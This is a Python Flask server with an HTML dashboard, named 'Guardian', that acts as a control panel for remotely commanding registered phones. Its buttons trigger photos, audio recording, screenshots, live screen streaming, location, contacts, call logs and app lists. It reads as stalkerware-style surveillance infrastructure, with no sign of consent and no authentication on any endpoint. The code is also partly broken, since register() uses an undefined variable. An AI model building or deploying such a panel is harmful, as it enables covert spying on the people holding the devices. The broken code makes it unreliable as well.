#!/usr/bin/env python3
"""
Guardian App Server - Railway Deployment
Port: Railway assigns port via PORT environment variable
"""

from flask import Flask, request, jsonify, send_file, Response
from flask_cors import CORS
import os
from datetime import datetime
import uuid
import time
import json

app = Flask(__name__)
CORS(app)

# Config - Railway provides PORT env var
PORT = int(os.environ.get('PORT', 5000))

# In-memory storage (Railway ephemeral filesystem)
devices = {}
command_inbox = {}
activity_log = []
command_id_counter = 0

# ==================== API Routes ====================

@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'service': 'Guardian App Server',
        'endpoints': ['/register', '/inbox', '/get_command', '/upload', '/send_command', '/api/devices', '/dashboard']
    })

@app.route('/register', methods=['POST'])
def register():
    data = request.json or {}
    device_id = data.get('device_id') or str(uuid.uuid4())[:16]
    device_info = {
        'id': device_id,
        'name': data.get('device_name', 'Unknown'),
        'model': data.get('model', ''),
        'last_seen': datetime.utcnow().isoformat(),
        'ip': request.remote_addr,
        'status': 'online'
    }
    devices[device_id] = device_info
    activity_log.append(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Device {device_name} registered")
    return jsonify({'status': 'ok', 'device_id': device_id})

@app.route('/inbox', methods=['GET'])
def inbox():
    device_id = request.args.get('device_id', '')
    if device_id in command_inbox and command_inbox[device_id]:
        cmd = command_inbox[device_id].pop(0)
        return jsonify({'command': cmd})
    return jsonify({'command': None})

@app.route('/get_command', methods=['GET'])
def get_command():
    device_id = request.args.get('device_id', '')
    if device_id in command_inbox and command_inbox[device_id]:
        cmd = command_inbox[device_id].pop(0)
        global command_id_counter
        command_id_counter += 1
        return jsonify(f"{command_id_counter}|{cmd}")
    return jsonify("0|")

@app.route('/send_command', methods=['POST'])
def send_command():
    global command_id_counter
    data = request.json or {}
    device_id = data.get('device_id')
    command = data.get('command', '')
    if not device_id or not command:
        return jsonify({'error': 'missing device_id or command'}), 400
    if device_id not in command_inbox:
        command_inbox[device_id] = []
    command_inbox[device_id].append(command)
    command_id_counter += 1
    activity_log.append(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Command '{command}' sent to {device_id}")
    return jsonify({'status': 'ok', 'cmd_id': command_id_counter})

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files.get('file')
    if f:
        data = f.read()
        return jsonify({'status': 'ok', 'size': len(data)})
    # Also accept raw body
    data = request.data
    if data:
        return jsonify({'status': 'ok', 'size': len(data)})
    return jsonify({'error': 'no data'}), 400

@app.route('/api/devices', methods=['GET'])
def api_devices():
    return jsonify(list(devices.values()))

@app.route('/api/logs', methods=['GET'])
def api_logs():
    return jsonify(activity_log[-50:])

@app.route('/dashboard')
def dashboard():
    html = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Guardian Control Panel</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:-apple-system,sans-serif; background:#0a0a0a; color:#e0e0e0; padding:20px; }
h1 { color:#4fc3f7; margin-bottom:20px; font-size:24px; }
.card { background:#1a1a2e; border-radius:12px; padding:20px; margin-bottom:16px; }
.card h2 { color:#4fc3f7; font-size:16px; margin-bottom:12px; }
.btn { padding:10px 18px; border:none; border-radius:8px; cursor:pointer; font-size:13px; margin:4px; font-weight:600; }
.btn-blue { background:#4fc3f7; color:#000; }
.btn-red { background:#ef5350; color:#fff; }
.btn-green { background:#66bb6a; color:#fff; }
.btn-orange { background:#ffa726; color:#000; }
.btn-purple { background:#ab47bc; color:#fff; }
select, input { background:#16213e; color:#e0e0e0; border:1px solid #333; border-radius:6px; padding:8px 12px; font-size:14px; }
.device-list { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:12px; }
.device-chip { background:#0f3460; padding:6px 14px; border-radius:20px; font-size:13px; cursor:pointer; }
.device-chip.active { background:#4fc3f7; color:#000; font-weight:bold; }
.log-area { background:#0d1117; border-radius:8px; padding:12px; max-height:300px; overflow-y:auto; font-family:monospace; font-size:12px; color:#8b949e; white-space:pre-wrap; }
.status-dot { display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px; }
.status-online { background:#66bb6a; }
.status-offline { background:#ef5350; }
.grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(140px,1fr)); gap:8px; }
.stat-box { background:#16213e; border-radius:8px; padding:12px; text-align:center; }
.stat-num { font-size:24px; font-weight:bold; color:#4fc3f7; }
.stat-label { font-size:11px; color:#888; margin-top:4px; }
</style></head><body>
<h1>🛡️ Guardian Control Panel</h1>
<div class="card"><h2>📱 Devices (<span id="devCount">0</span>)</h2>
<div id="deviceList" class="device-list"></div>
<select id="selDevice"><option value="">Select device...</option></select></div>

<div class="card"><h2>🎮 Commands</h2>
<div class="grid">
<button class="btn btn-blue" data-cmd="take_photo">📸 Photo</button>
<button class="btn btn-green" data-cmd="get_location">📍 Location</button>
<button class="btn btn-orange" data-cmd="start_recording">🎙️ Record</button>
<button class="btn btn-red" data-cmd="stop_recording">⏹️ Stop Rec</button>
<button class="btn btn-purple" data-cmd="screenshot">🖥️ Screenshot</button>
<button class="btn btn-blue" data-cmd="screen_stream">📺 Screen Live</button>
<button class="btn btn-green" data-cmd="stop_screen">⏹️ Stop Screen</button>
<button class="btn btn-orange" data-cmd="get_apps">📋 App List</button>
<button class="btn btn-purple" data-cmd="get_contacts">👥 Contacts</button>
<button class="btn btn-blue" data-cmd="get_calls">📞 Call Log</button>
<button class="btn btn-red" data-cmd="alert">🚨 Alert</button>
<button class="btn btn-green" data-cmd="device_info">ℹ️ Device Info</button>
</div></div>

<div class="card"><h2>📊 Status</h2>
<div class="grid">
<div class="stat-box"><div class="stat-num" id="statDevices">0</div><div class="stat-label">Devices</div></div>
<div class="stat-box"><div class="stat-num" id="statCommands">0</div><div class="stat-label">Commands Sent</div></div>
<div class="stat-box"><div class="stat-num" id="statOnline">0</div><div class="stat-label">Online</div></div>
</div></div>

<div class="card"><h2>📜 Activity Log</h2><div id="logArea" class="log-area">Waiting for activity...</div></div>

<script>
let selectedDevice = '';
let cmdCount = 0;

async function refresh() {
    try {
        const r = await fetch('/api/devices');
        const devs = await r.json();
        const list = document.getElementById('deviceList');
        const sel = document.getElementById('selDevice');
        const prev = sel.value;
        sel.innerHTML = '<option value="">Select device...</option>';
        list.innerHTML = '';
        let online = 0;
        devs.forEach(d => {
            const chip = document.createElement('span');
            chip.className = 'device-chip' + (d.id === selectedDevice ? ' active' : '');
            chip.textContent = d.name || d.id;
            chip.onclick = () => selectDevice(d.id);
            list.appendChild(chip);
            const opt = document.createElement('option');
            opt.value = d.id;
            opt.textContent = (d.name || d.id) + (d.status === 'online' ? ' ✓' : '');
            sel.appendChild(opt);
            if (d.status === 'online') online++;
        });
        document.getElementById('devCount').textContent = devs.length;
        document.getElementById('statDevices').textContent = devs.length;
        document.getElementById('statOnline').textContent = online;
        if (prev && devs.some(d => d.id === prev)) sel.value = prev;
    } catch(e) {}
    try {
        const r = await fetch('/api/logs');
        const logs = await r.json();
        document.getElementById('logArea').textContent = logs.join('\\n') || 'No activity yet';
    } catch(e) {}
}

function selectDevice(id) {
    selectedDevice = id;
    document.querySelectorAll('.device-chip').forEach(c => c.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById('selDevice').value = id;
}

document.querySelectorAll('[data-cmd]').forEach(btn => {
    btn.addEventListener('click', async function() {
        const cmd = this.dataset.cmd;
        const devId = selectedDevice || document.getElementById('selDevice').value;
        if (!devId) { alert('Please select a device first'); return; }
        try {
            const r = await fetch('/send_command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({device_id: devId, command: cmd})
            });
            cmdCount++;
            document.getElementById('statCommands').textContent = cmdCount;
            refresh();
        } catch(e) { alert('Failed to send: ' + e.message); }
    });
});

document.getElementById('selDevice').addEventListener('change', function() {
    selectedDevice = this.value;
});

refresh();
setInterval(refresh, 5000);
</script></body></html>"""
    return Response(html, mimetype='text/html')

@app.route('/health')
def health():
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
